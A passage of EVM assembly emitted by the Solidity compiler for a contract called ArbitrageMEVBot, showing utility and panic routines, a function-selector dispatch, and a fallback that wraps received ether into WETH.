\"#utility.yul\":1344:1409   */\n  swap1\n  pop\n    /* \"#utility.yul\":1289:1415   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1421:1517   */\ntag_172:\n    /* \"#utility.yul\":1458:1465   */\n  0x00\n    /* \"#utility.yul\":1487:1511   */\n  tag_197\n    /* \"#utility.yul\":1505:1510   */\n  dup3\n    /* \"#utility.yul\":1487:1511   */\n  tag_171\n  jump\t// in\ntag_197:\n    /* \"#utility.yul\":1476:1511   */\n  swap1\n  pop\n    /* \"#utility.yul\":1421:1517   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1523:1641   */\ntag_173:\n    /* \"#utility.yul\":1610:1634   */\n  tag_199\n    /* \"#utility.yul\":1628:1633   */\n  dup2\n    /* \"#utility.yul\":1610:1634   */\n  tag_172\n  jump\t// in\ntag_199:\n    /* \"#utility.yul\":1605:1608   */\n  dup3\n    /* \"#utility.yul\":1598:1635   */\n  mstore\n    /* \"#utility.yul\":1523:1641   */\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1647:1827   */\ntag_174:\n    /* \"#utility.yul\":1695:1772   */\n  0x4e487b7100000000000000000000000000000000000000000000000000000000\n    /* \"#utility.yul\":1692:1693   */\n  0x00\n    /* \"#utility.yul\":1685:1773   */\n  mstore\n    /* \"#utility.yul\":1792:1796   */\n  0x21\n    /* \"#utility.yul\":1789:1790   */\n  0x04\n    /* \"#utility.yul\":1782:1797   */\n  mstore\n    /* \"#utility.yul\":1816:1820   */\n  0x24\n    /* \"#utility.yul\":1813:1814   */\n  0x00\n    /* \"#utility.yul\":1806:1821   */\n  revert\n    /* \"#utility.yul\":1833:1952   */\ntag_175:\n    /* \"#utility.yul\":1920:1921   */\n  0x04\n    /* \"#utility.yul\":1913:1918   */\n  dup2\n    /* \"#utility.yul\":1910:1922   */\n  lt\n    /* \"#utility.yul\":1900:1946   */\n  tag_202\n  jumpi\n    /* \"#utility.yul\":1926:1944   */\n  tag_203\n  tag_174\n  jump\t// in\ntag_203:\n    /* \"#utility.yul\":1900:1946   */\ntag_202:\n    /* \"#utility.yul\":1833:1952   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1958:2097   */\ntag_176:\n    /* \"#utility.yul\":2009:2016   */\n  0x00\n    /* \"#utility.yul\":2038:2043   */\n  dup2\n    /* \"#utility.yul\":2027:2043   */\n  swap1\n  pop\n    /* \"#utility.yul\":2044:2091   */\n  tag_205\n    /* \"#utility.yul\":2085:2090   */\n  dup3\n    /* \"#utility.yul\":2044:2091   */\n  tag_175\n  jump\t// in\ntag_205:\n    /* \"#utility.yul\":1958:2097   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2103:2242   */\ntag_177:\n    /* \"#utility.yul\":2165:2174   */\n  0x00\n    /* \"#utility.yul\":2198:2236   */\n  tag_207\n    /* \"#utility.yul\":2230:2235   */\n  dup3\n    /* \"#utility.yul\":2198:2236   */\n  tag_176\n  jump\t// in\ntag_207:\n    /* \"#utility.yul\":2185:2236   */\n  swap1\n  pop\n    /* \"#utility.yul\":2103:2242   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2248:2403   */\ntag_178:\n    /* \"#utility.yul\":2347:2396   */\n  tag_209\n    /* \"#utility.yul\":2390:2395   */\n  dup2\n    /* \"#utility.yul\":2347:2396   */\n  tag_177\n  jump\t// in\ntag_209:\n    /* \"#utility.yul\":2342:2345   */\n  dup3\n    /* \"#utility.yul\":2335:2397   */\n  mstore\n    /* \"#utility.yul\":2248:2403   */\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2409:2875   */\ntag_18:\n    /* \"#utility.yul\":2570:2574   */\n  0x00\n    /* \"#utility.yul\":2608:2610   */\n  0x60\n    /* \"#utility.yul\":2597:2606   */\n  dup3\n    /* \"#utility.yul\":2593:2611   */\n  add\n    /* \"#utility.yul\":2585:2611   */\n  swap1\n  pop\n    /* \"#utility.yul\":2621:2692   */\n  tag_211\n    /* \"#utility.yul\":2689:2690   */\n  0x00\n    /* \"#utility.yul\":2678:2687   */\n  dup4\n    /* \"#utility.yul\":2674:2691   */\n  add\n    /* \"#utility.yul\":2665:2671   */\n  dup7\n    /* \"#utility.yul\":2621:2692   */\n  tag_173\n  jump\t// in\ntag_211:\n    /* \"#utility.yul\":2702:2774   */\n  tag_212\n    /* \"#utility.yul\":2770:2772   */\n  0x20\n    /* \"#utility.yul\":2759:2768   */\n  dup4\n    /* \"#utility.yul\":2755:2773   */\n  add\n    /* \"#utility.yul\":2746:2752   */\n  dup6\n    /* \"#utility.yul\":2702:2774   */\n  tag_173\n  jump\t// in\ntag_212:\n    /* \"#utility.yul\":2784:2868   */\n  tag_213\n    /* \"#utility.yul\":2864:2866   */\n  0x40\n    /* \"#utility.yul\":2853:2862   */\n  dup4\n    /* \"#utility.yul\":2849:2867   */\n  add\n    /* \"#utility.yul\":2840:2846   */\n  dup5\n    /* \"#utility.yul\":2784:2868   */\n  tag_178\n  jump\t// in\ntag_213:\n    /* \"#utility.yul\":2409:2875   */\n  swap5\n  swap4\n  pop\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2881:2979   */\ntag_179:\n    /* \"#utility.yul\":2932:2938   */\n  0x00\n    /* \"#utility.yul\":2966:2971   */\n  dup2\n    /* \"#utility.yul\":2960:2972   */\n  mload\n    /* \"#utility.yul\":2950:2972   */\n  swap1\n  pop\n    /* \"#utility.yul\":2881:2979   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2985:3132   */\ntag_180:\n    /* \"#utility.yul\":3086:3097   */\n  0x00\n    /* \"#utility.yul\":3123:3126   */\n  dup2\n    /* \"#utility.yul\":3108:3126   */\n  swap1\n  pop\n    /* \"#utility.yul\":2985:3132   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":3138:3384   */\ntag_181:\n    /* \"#utility.yul\":3219:3220   */\n  0x00\n    /* \"#utility.yul\":3229:3342   */\ntag_217:\n    /* \"#utility.yul\":3243:3249   */\n  dup4\n    /* \"#utility.yul\":3240:3241   */\n  dup2\n    /* \"#utility.yul\":3237:3250   */\n  lt\n    /* \"#utility.yul\":3229:3342   */\n  iszero\n  tag_219\n  jumpi\n    /* \"#utility.yul\":3328:3329   */\n  dup1\n    /* \"#utility.yul\":3323:3326   */\n  dup3\n    /* \"#utility.yul\":3319:3330   */\n  add\n    /* \"#utility.yul\":3313:3331   */\n  mload\n    /* \"#utility.yul\":3309:3310   */\n  dup2\n    /* \"#utility.yul\":3304:3307   */\n  dup5\n    /* \"#utility.yul\":3300:3311   */\n  add\n    /* \"#utility.yul\":3293:3332   */\n  mstore\n    /* \"#utility.yul\":3265:3267   */\n  0x20\n    /* \"#utility.yul\":3262:3263   */\n  dup2\n    /* \"#utility.yul\":3258:3268   */\n  add\n    /* \"#utility.yul\":3253:3268   */\n  swap1\n  pop\n    /* \"#utility.yul\":3229:3342   */\n  jump(tag_217)\ntag_219:\n    /* \"#utility.yul\":3376:3377   */\n  0x00\n    /* \"#utility.yul\":3367:3373   */\n  dup5\n    /* \"#utility.yul\":3362:3365   */\n  dup5\n    /* \"#utility.yul\":3358:3374   */\n  add\n    /* \"#utility.yul\":3351:3378   */\n  mstore\n    /* \"#utility.yul\":3200:3384   */\n  pop\n    /* \"#utility.yul\":3138:3384   */\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":3390:3776   */\ntag_182:\n    /* \"#utility.yul\":3494:3497   */\n  0x00\n    /* \"#utility.yul\":3522:3560   */\n  tag_221\n    /* \"#utility.yul\":3554:3559   */\n  dup3\n    /* \"#utility.yul\":3522:3560   */\n  tag_179\n  jump\t// in\ntag_221:\n    /* \"#utility.yul\":3576:3664   */\n  tag_222\n    /* \"#utility.yul\":3657:3663   */\n  dup2\n    /* \"#utility.yul\":3652:3655   */\n  dup6\n    /* \"#utility.yul\":3576:3664   */\n  tag_180\n  jump\t// in\ntag_222:\n    /* \"#utility.yul\":3569:3664   */\n  swap4\n  pop\n    /* \"#utility.yul\":3673:3738   */\n  tag_223\n    /* \"#utility.yul\":3731:3737   */\n  dup2\n    /* \"#utility.yul\":3726:3729   */\n  dup6\n    /* \"#utility.yul\":3719:3723   */\n  0x20\n    /* \"#utility.yul\":3712:3717   */\n  dup7\n    /* \"#utility.yul\":3708:3724   */\n  add\n    /* \"#utility.yul\":3673:3738   */\n  tag_181\n  jump\t// in\ntag_223:\n    /* \"#utility.yul\":3763:3769   */\n  dup1\n    /* \"#utility.yul\":3758:3761   */\n  dup5\n    /* \"#utility.yul\":3754:3770   */\n  add\n    /* \"#utility.yul\":3747:3770   */\n  swap2\n  pop\n    /* \"#utility.yul\":3498:3776   */\n  pop\n    /* \"#utility.yul\":3390:3776   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":3782:4053   */\ntag_20:\n    /* \"#utility.yul\":3912:3915   */\n  0x00\n    /* \"#utility.yul\":3934:4027   */\n  tag_225\n    /* \"#utility.yul\":4023:4026   */\n  dup3\n    /* \"#utility.yul\":4014:4020   */\n  dup5\n    /* \"#utility.yul\":3934:4027   */\n  tag_182\n  jump\t// in\ntag_225:\n    /* \"#utility.yul\":3927:4027   */\n  swap2\n  pop\n    /* \"#utility.yul\":4044:4047   */\n  dup2\n    /* \"#utility.yul\":4037:4047   */\n  swap1\n  pop\n    /* \"#utility.yul\":3782:4053   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":4059:4239   */\ntag_183:\n    /* \"#utility.yul\":4107:4184   */\n  0x4e487b7100000000000000000000000000000000000000000000000000000000\n    /* \"#utility.yul\":4104:4105   */\n  0x00\n    /* \"#utility.yul\":4097:4185   */\n  mstore\n    /* \"#utility.yul\":4204:4208   */\n  0x11\n    /* \"#utility.yul\":4201:4202   */\n  0x04\n    /* \"#utility.yul\":4194:4209   */\n  mstore\n    /* \"#utility.yul\":4228:4232   */\n  0x24\n    /* \"#utility.yul\":4225:4226   */\n  0x00\n    /* \"#utility.yul\":4218:4233   */\n  revert\n    /* \"#utility.yul\":4245:4655   */\ntag_57:\n    /* \"#utility.yul\":4285:4292   */\n  0x00\n    /* \"#utility.yul\":4308:4328   */\n  tag_228\n    /* \"#utility.yul\":4326:4327   */\n  dup3\n    /* \"#utility.yul\":4308:4328   */\n  tag_171\n  jump\t// in\ntag_228:\n    /* \"#utility.yul\":4303:4328   */\n  swap2\n  pop\n    /* \"#utility.yul\":4342:4362   */\n  tag_229\n    /* \"#utility.yul\":4360:4361   */\n  dup4\n    /* \"#utility.yul\":4342:4362   */\n  tag_171\n  jump\t// in\ntag_229:\n    /* \"#utility.yul\":4337:4362   */\n  swap3\n  pop\n    /* \"#utility.yul\":4397:4398   */\n  dup3\n    /* \"#utility.yul\":4394:4395   */\n  dup3\n    /* \"#utility.yul\":4390:4399   */\n  mul\n    /* \"#utility.yul\":4419:4449   */\n  tag_230\n    /* \"#utility.yul\":4437:4448   */\n  dup2\n    /* \"#utility.yul\":4419:4449   */\n  tag_171\n  jump\t// in\ntag_230:\n    /* \"#utility.yul\":4408:4449   */\n  swap2\n  pop\n    /* \"#utility.yul\":4598:4599   */\n  dup3\n    /* \"#utility.yul\":4589:4596   */\n  dup3\n    /* \"#utility.yul\":4585:4600   */\n  div\n    /* \"#utility.yul\":4582:4583   */\n  dup5\n    /* \"#utility.yul\":4579:4601   */\n  eq\n    /* \"#utility.yul\":4559:4560   */\n  dup4\n    /* \"#utility.yul\":4552:4561   */\n  iszero\n    /* \"#utility.yul\":4532:4615   */\n  or\n    /* \"#utility.yul\":4509:4648   */\n  tag_231\n  jumpi\n    /* \"#utility.yul\":4628:4646   */\n  tag_232\n  tag_183\n  jump\t// in\ntag_232:\n    /* \"#utility.yul\":4509:4648   */\ntag_231:\n    /* \"#utility.yul\":4293:4655   */\n  pop\n    /* \"#utility.yul\":4245:4655   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":4661:4841   */\ntag_60:\n    /* \"#utility.yul\":4709:4786   */\n  0x4e487b7100000000000000000000000000000000000000000000000000000000\n    /* \"#utility.yul\":4706:4707   */\n  0x00\n    /* \"#utility.yul\":4699:4787   */\n  mstore\n    /* \"#utility.yul\":4806:4810   */\n  0x32\n    /* \"#utility.yul\":4803:4804   */\n  0x04\n    /* \"#utility.yul\":4796:4811   */\n  mstore\n    /* \"#utility.yul\":4830:4834   */\n  0x24\n    /* \"#utility.yul\":4827:4828   */\n  0x00\n    /* \"#utility.yul\":4820:4835   */\n  revert\n    /* \"#utility.yul\":4847:4924   */\ntag_184:\n    /* \"#utility.yul\":4884:4891   */\n  0x00\n    /* \"#utility.yul\":4913:4918   */\n  dup2\n    /* \"#utility.yul\":4902:4918   */\n  swap1\n  pop\n    /* \"#utility.yul\":4847:4924   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":4930:5121   */\ntag_62:\n    /* \"#utility.yul\":4970:4973   */\n  0x00\n    /* \"#utility.yul\":4989:5009   */\n  tag_236\n    /* \"#utility.yul\":5007:5008   */\n  dup3\n    /* \"#utility.yul\":4989:5009   */\n  tag_184\n  jump\t// in\ntag_236:\n    /* \"#utility.yul\":4984:5009   */\n  swap2\n  pop\n    /* \"#utility.yul\":5023:5043   */\n  tag_237\n    /* \"#utility.yul\":5041:5042   */\n  dup4\n    /* \"#utility.yul\":5023:5043   */\n  tag_184\n  jump\t// in\ntag_237:\n    /* \"#utility.yul\":5018:5043   */\n  swap3\n  pop\n    /* \"#utility.yul\":5066:5067   */\n  dup3\n    /* \"#utility.yul\":5063:5064   */\n  dup3\n    /* \"#utility.yul\":5059:5068   */\n  add\n    /* \"#utility.yul\":5052:5068   */\n  swap1\n  pop\n    /* \"#utility.yul\":5087:5090   */\n  dup1\n    /* \"#utility.yul\":5084:5085   */\n  dup3\n    /* \"#utility.yul\":5081:5091   */\n  gt\n    /* \"#utility.yul\":5078:5114   */\n  iszero\n  tag_238\n  jumpi\n    /* \"#utility.yul\":5094:5112   */\n  tag_239\n  tag_183\n  jump\t// in\ntag_239:\n    /* \"#utility.yul\":5078:5114   */\ntag_238:\n    /* \"#utility.yul\":4930:5121   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":5127:5362   */\ntag_68:\n    /* \"#utility.yul\":5167:5171   */\n  0x00\n    /* \"#utility.yul\":5187:5207   */\n  tag_241\n    /* \"#utility.yul\":5205:5206   */\n  dup3\n    /* \"#utility.yul\":5187:5207   */\n  tag_171\n  jump\t// in\ntag_241:\n    /* \"#utility.yul\":5182:5207   */\n  swap2\n  pop\n    /* \"#utility.yul\":5221:5241   */\n  tag_242\n    /* \"#utility.yul\":5239:5240   */\n  dup4\n    /* \"#utility.yul\":5221:5241   */\n  tag_171\n  jump\t// in\ntag_242:\n    /* \"#utility.yul\":5216:5241   */\n  swap3\n  pop\n    /* \"#utility.yul\":5265:5266   */\n  dup3\n    /* \"#utility.yul\":5262:5263   */\n  dup3\n    /* \"#utility.yul\":5258:5267   */\n  sub\n    /* \"#utility.yul\":5250:5267   */\n  swap1\n  pop\n    /* \"#utility.yul\":5289:5331   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":5283:5287   */\n  dup2\n    /* \"#utility.yul\":5280:5332   */\n  gt\n    /* \"#utility.yul\":5277:5355   */\n  iszero\n  tag_243\n  jumpi\n    /* \"#utility.yul\":5335:5353   */\n  tag_244\n  tag_183\n  jump\t// in\ntag_244:\n    /* \"#utility.yul\":5277:5355   */\ntag_243:\n    /* \"#utility.yul\":5127:5362   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":5368:5600   */\ntag_90:\n    /* \"#utility.yul\":5408:5411   */\n  0x00\n    /* \"#utility.yul\":5427:5447   */\n  tag_246\n    /* \"#utility.yul\":5445:5446   */\n  dup3\n    /* \"#utility.yul\":5427:5447   */\n  tag_171\n  jump\t// in\ntag_246:\n    /* \"#utility.yul\":5422:5447   */\n  swap2\n  pop\n    /* \"#utility.yul\":5461:5481   */\n  tag_247\n    /* \"#utility.yul\":5479:5480   */\n  dup4\n    /* \"#utility.yul\":5461:5481   */\n  tag_171\n  jump\t// in\ntag_247:\n    /* \"#utility.yul\":5456:5481   */\n  swap3\n  pop\n    /* \"#utility.yul\":5504:5505   */\n  dup3\n    /* \"#utility.yul\":5501:5502   */\n  dup3\n    /* \"#utility.yul\":5497:5506   */\n  add\n    /* \"#utility.yul\":5490:5506   */\n  swap1\n  pop\n    /* \"#utility.yul\":5527:5569   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":5522:5525   */\n  dup2\n    /* \"#utility.yul\":5519:5570   */\n  gt\n    /* \"#utility.yul\":5516:5593   */\n  iszero\n  tag_248\n  jumpi\n    /* \"#utility.yul\":5573:5591   */\n  tag_249\n  tag_183\n  jump\t// in\ntag_249:\n    /* \"#utility.yul\":5516:5593   */\ntag_248:\n    /* \"#utility.yul\":5368:5600   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":5606:5839   */\ntag_102:\n    /* \"#utility.yul\":5645:5648   */\n  0x00\n    /* \"#utility.yul\":5668:5692   */\n  tag_251\n    /* \"#utility.yul\":5686:5691   */\n  dup3\n    /* \"#utility.yul\":5668:5692   */\n  tag_184\n  jump\t// in\ntag_251:\n    /* \"#utility.yul\":5659:5692   */\n  swap2\n  pop\n    /* \"#utility.yul\":5714:5780   */\n  0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":5707:5712   */\n  dup3\n    /* \"#utility.yul\":5704:5781   */\n  sub\n    /* \"#utility.yul\":5701:5804   */\n  tag_252\n  jumpi\n    /* \"#utility.yul\":5784:5802   */\n  tag_253\n  tag_183\n  jump\t// in\ntag_253:\n    /* \"#utility.yul\":5701:5804   */\ntag_252:\n    /* \"#utility.yul\":5831:5832   */\n  0x01\n    /* \"#utility.yul\":5824:5829   */\n  dup3\n    /* \"#utility.yul\":5820:5833   */\n  add\n    /* \"#utility.yul\":5813:5833   */\n  swap1\n  pop\n    /* \"#utility.yul\":5606:5839   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":5845:6025   */\ntag_185:\n    /* \"#utility.yul\":5893:5970   */\n  0x4e487b7100000000000000000000000000000000000000000000000000000000\n    /* \"#utility.yul\":5890:5891   */\n  0x00\n    /* \"#utility.yul\":5883:5971   */\n  mstore\n    /* \"#utility.yul\":5990:5994   */\n  0x12\n    /* \"#utility.yul\":5987:5988   */\n  0x04\n    /* \"#utility.yul\":5980:5995   */\n  mstore\n    /* \"#utility.yul\":6014:6018   */\n  0x24\n    /* \"#utility.yul\":6011:6012   */\n  0x00\n    /* \"#utility.yul\":6004:6019   */\n  revert\n    /* \"#utility.yul\":6031:6216   */\ntag_104:\n    /* \"#utility.yul\":6071:6072   */\n  0x00\n    /* \"#utility.yul\":6088:6108   */\n  tag_256\n    /* \"#utility.yul\":6106:6107   */\n  dup3\n    /* \"#utility.yul\":6088:6108   */\n  tag_184\n  jump\t// in\ntag_256:\n    /* \"#utility.yul\":6083:6108   */\n  swap2\n  pop\n    /* \"#utility.yul\":6122:6142   */\n  tag_257\n    /* \"#utility.yul\":6140:6141   */\n  dup4\n    /* \"#utility.yul\":6122:6142   */\n  tag_184\n  jump\t// in\ntag_257:\n    /* \"#utility.yul\":6117:6142   */\n  swap3\n  pop\n    /* \"#utility.yul\":6161:6162   */\n  dup3\n    /* \"#utility.yul\":6151:6186   */\n  tag_258\n  jumpi\n    /* \"#utility.yul\":6166:6184   */\n  tag_259\n  tag_185\n  jump\t// in\ntag_259:\n    /* \"#utility.yul\":6151:6186   */\ntag_258:\n    /* \"#utility.yul\":6208:6209   */\n  dup3\n    /* \"#utility.yul\":6205:6206   */\n  dup3\n    /* \"#utility.yul\":6201:6210   */\n  div\n    /* \"#utility.yul\":6196:6210   */\n  swap1\n  pop\n    /* \"#utility.yul\":6031:6216   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":6222:6402   */\ntag_107:\n    /* \"#utility.yul\":6270:6347   */\n  0x4e487b7100000000000000000000000000000000000000000000000000000000\n    /* \"#utility.yul\":6267:6268   */\n  0x00\n    /* \"#utility.yul\":6260:6348   */\n  mstore\n    /* \"#utility.yul\":6367:6371   */\n  0x41\n    /* \"#utility.yul\":6364:6365   */\n  0x04\n    /* \"#utility.yul\":6357:6372   */\n  mstore\n    /* \"#utility.yul\":6391:6395   */\n  0x24\n    /* \"#utility.yul\":6388:6389   */\n  0x00\n    /* \"#utility.yul\":6381:6396   */\n  revert\n    /* \"#utility.yul\":6408:6584   */\ntag_113:\n    /* \"#utility.yul\":6440:6441   */\n  0x00\n    /* \"#utility.yul\":6457:6477   */\n  tag_262\n    /* \"#utility.yul\":6475:6476   */\n  dup3\n    /* \"#utility.yul\":6457:6477   */\n  tag_184\n  jump\t// in\ntag_262:\n    /* \"#utility.yul\":6452:6477   */\n  swap2\n  pop\n    /* \"#utility.yul\":6491:6511   */\n  tag_263\n    /* \"#utility.yul\":6509:6510   */\n  dup4\n    /* \"#utility.yul\":6491:6511   */\n  tag_184\n  jump\t// in\ntag_263:\n    /* \"#utility.yul\":6486:6511   */\n  swap3\n  pop\n    /* \"#utility.yul\":6530:6531   */\n  dup3\n    /* \"#utility.yul\":6520:6555   */\n  tag_264\n  jumpi\n    /* \"#utility.yul\":6535:6553   */\n  tag_265\n  tag_185\n  jump\t// in\ntag_265:\n    /* \"#utility.yul\":6520:6555   */\ntag_264:\n    /* \"#utility.yul\":6576:6577   */\n  dup3\n    /* \"#utility.yul\":6573:6574   */\n  dup3\n    /* \"#utility.yul\":6569:6578   */\n  mod\n    /* \"#utility.yul\":6564:6578   */\n  swap1\n  pop\n    /* \"#utility.yul\":6408:6584   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":6590:6784   */\ntag_117:\n    /* \"#utility.yul\":6630:6634   */\n  0x00\n    /* \"#utility.yul\":6650:6670   */\n  tag_267\n    /* \"#utility.yul\":6668:6669   */\n  dup3\n    /* \"#utility.yul\":6650:6670   */\n  tag_184\n  jump\t// in\ntag_267:\n    /* \"#utility.yul\":6645:6670   */\n  swap2\n  pop\n    /* \"#utility.yul\":6684:6704   */\n  tag_268\n    /* \"#utility.yul\":6702:6703   */\n  dup4\n    /* \"#utility.yul\":6684:6704   */\n  tag_184\n  jump\t// in\ntag_268:\n    /* \"#utility.yul\":6679:6704   */\n  swap3\n  pop\n    /* \"#utility.yul\":6728:6729   */\n  dup3\n    /* \"#utility.yul\":6725:6726   */\n  dup3\n    /* \"#utility.yul\":6721:6730   */\n  sub\n    /* \"#utility.yul\":6713:6730   */\n  swap1\n  pop\n    /* \"#utility.yul\":6752:6753   */\n  dup2\n    /* \"#utility.yul\":6746:6750   */\n  dup2\n    /* \"#utility.yul\":6743:6754   */\n  gt\n    /* \"#utility.yul\":6740:6777   */\n  iszero\n  tag_269\n  jumpi\n    /* \"#utility.yul\":6757:6775   */\n  tag_270\n  tag_183\n  jump\t// in\ntag_270:\n    /* \"#utility.yul\":6740:6777   */\ntag_269:\n    /* \"#utility.yul\":6590:6784   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":6790:6876   */\ntag_186:\n    /* \"#utility.yul\":6825:6832   */\n  0x00\n    /* \"#utility.yul\":6865:6869   */\n  0xff\n    /* \"#utility.yul\":6858:6863   */\n  dup3\n    /* \"#utility.yul\":6854:6870   */\n  and\n    /* \"#utility.yul\":6843:6870   */\n  swap1\n  pop\n    /* \"#utility.yul\":6790:6876   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":6882:7070   */\ntag_161:\n    /* \"#utility.yul\":6920:6923   */\n  0x00\n    /* \"#utility.yul\":6939:6957   */\n  tag_273\n    /* \"#utility.yul\":6955:6956   */\n  dup3\n    /* \"#utility.yul\":6939:6957   */\n  tag_186\n  jump\t// in\ntag_273:\n    /* \"#utility.yul\":6934:6957   */\n  swap2\n  pop\n    /* \"#utility.yul\":6971:6989   */\n  tag_274\n    /* \"#utility.yul\":6987:6988   */\n  dup4\n    /* \"#utility.yul\":6971:6989   */\n  tag_186\n  jump\t// in\ntag_274:\n    /* \"#utility.yul\":6966:6989   */\n  swap3\n  pop\n    /* \"#utility.yul\":7012:7013   */\n  dup3\n    /* \"#utility.yul\":7009:7010   */\n  dup3\n    /* \"#utility.yul\":7005:7014   */\n  add\n    /* \"#utility.yul\":6998:7014   */\n  swap1\n  pop\n    /* \"#utility.yul\":7035:7039   */\n  0xff\n    /* \"#utility.yul\":7030:7033   */\n  dup2\n    /* \"#utility.yul\":7027:7040   */\n  gt\n    /* \"#utility.yul\":7024:7063   */\n  iszero\n  tag_275\n  jumpi\n    /* \"#utility.yul\":7043:7061   */\n  tag_276\n  tag_183\n  jump\t// in\ntag_276:\n    /* \"#utility.yul\":7024:7063   */\ntag_275:\n    /* \"#utility.yul\":6882:7070   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":7076:7267   */\ntag_167:\n    /* \"#utility.yul\":7114:7118   */\n  0x00\n    /* \"#utility.yul\":7134:7152   */\n  tag_278\n    /* \"#utility.yul\":7150:7151   */\n  dup3\n    /* \"#utility.yul\":7134:7152   */\n  tag_186\n  jump\t// in\ntag_278:\n    /* \"#utility.yul\":7129:7152   */\n  swap2\n  pop\n    /* \"#utility.yul\":7166:7184   */\n  tag_279\n    /* \"#utility.yul\":7182:7183   */\n  dup4\n    /* \"#utility.yul\":7166:7184   */\n  tag_186\n  jump\t// in\ntag_279:\n    /* \"#utility.yul\":7161:7184   */\n  swap3\n  pop\n    /* \"#utility.yul\":7208:7209   */\n  dup3\n    /* \"#utility.yul\":7205:7206   */\n  dup3\n    /* \"#utility.yul\":7201:7210   */\n  sub\n    /* \"#utility.yul\":7193:7210   */\n  swap1\n  pop\n    /* \"#utility.yul\":7232:7236   */\n  0xff\n    /* \"#utility.yul\":7226:7230   */\n  dup2\n    /* \"#utility.yul\":7223:7237   */\n  gt\n    /* \"#utility.yul\":7220:7260   */\n  iszero\n  tag_280\n  jumpi\n    /* \"#utility.yul\":7240:7258   */\n  tag_281\n  tag_183\n  jump\t// in\ntag_281:\n    /* \"#utility.yul\":7220:7260   */\ntag_280:\n    /* \"#utility.yul\":7076:7267   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"testbot.sol\":1262:9327  contract ArbitrageMEVBot {... */\ntag_9:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"testbot.sol\":1262:9327  contract ArbitrageMEVBot {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0xbe9a6555\n      gt\n      tag_10\n      jumpi\n      dup1\n      0xbe9a6555\n      eq\n      tag_6\n      jumpi\n      dup1\n      0xc55dae63\n      eq\n      tag_7\n      jumpi\n      dup1\n      0xd85bd526\n      eq\n      tag_8\n      jumpi\n      dup1\n      0xe086e5ec\n      eq\n      tag_9\n      jumpi\n      jump(tag_2)\n    tag_10:\n      dup1\n      0x07da68f5\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x217a4b70\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_5\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"testbot.sol\":8440:8447  running */\n      0x02\n      0x14\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"testbot.sol\":8436:8549  if (running) {... */\n      iszero\n      tag_13\n      jumpi\n        /* \"testbot.sol\":8463:8473  IWETH weth */\n      0x00\n        /* \"testbot.sol\":8482:8491  baseToken */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"testbot.sol\":8463:8492  IWETH weth = IWETH(baseToken) */\n      swap1\n      pop\n        /* \"testbot.sol\":8506:8510  weth */\n      dup1\n        /* \"testbot.sol\":8506:8518  weth.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"testbot.sol\":8526:8535  msg.value */\n      callvalue\n        /* \"testbot.sol\":8506:8538  weth.deposit{value: msg.value}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_14\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_14:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_16\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_16:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"testbot.sol\":8449:8549  {... */\n      pop\n        /* \"testbot.sol\":8436:8549  if (running) {... */\n    tag_13:\n        /* \"testbot.sol\":1262:9327  contract ArbitrageMEVBot {... */\n      stop\n    